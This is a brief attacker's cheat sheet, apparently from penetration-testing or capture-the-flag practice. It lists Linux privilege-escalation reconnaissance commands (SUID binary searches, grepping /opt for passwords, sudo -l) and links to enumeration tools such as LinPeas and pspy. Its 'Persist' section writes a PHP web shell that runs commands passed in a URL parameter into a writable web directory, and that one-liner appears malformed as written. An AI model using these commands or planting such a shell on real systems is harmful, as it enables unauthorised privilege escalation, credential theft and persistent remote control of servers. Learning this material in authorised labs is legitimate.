#### Recon Commands ####

```sudo -l```

```uname -a```

```find / -type f -perm -4000 2>/dev/null```

```grep -iRl password /opt/*```

```ls -la /opt```

?? or ??

```find / -perm -4000 -exec ls -l {} \;```

```ps aux```

```Run LSE```

> https://github.com/diego-treitos/linux-smart-enumeration

```run LinEnum.sh```

```run pspy32```

> https://github.com/DominicBreuker/pspy/blob/master/README.md

```Run LinPeas```

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

#### Persist ####

```echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/not-a-shell.php```

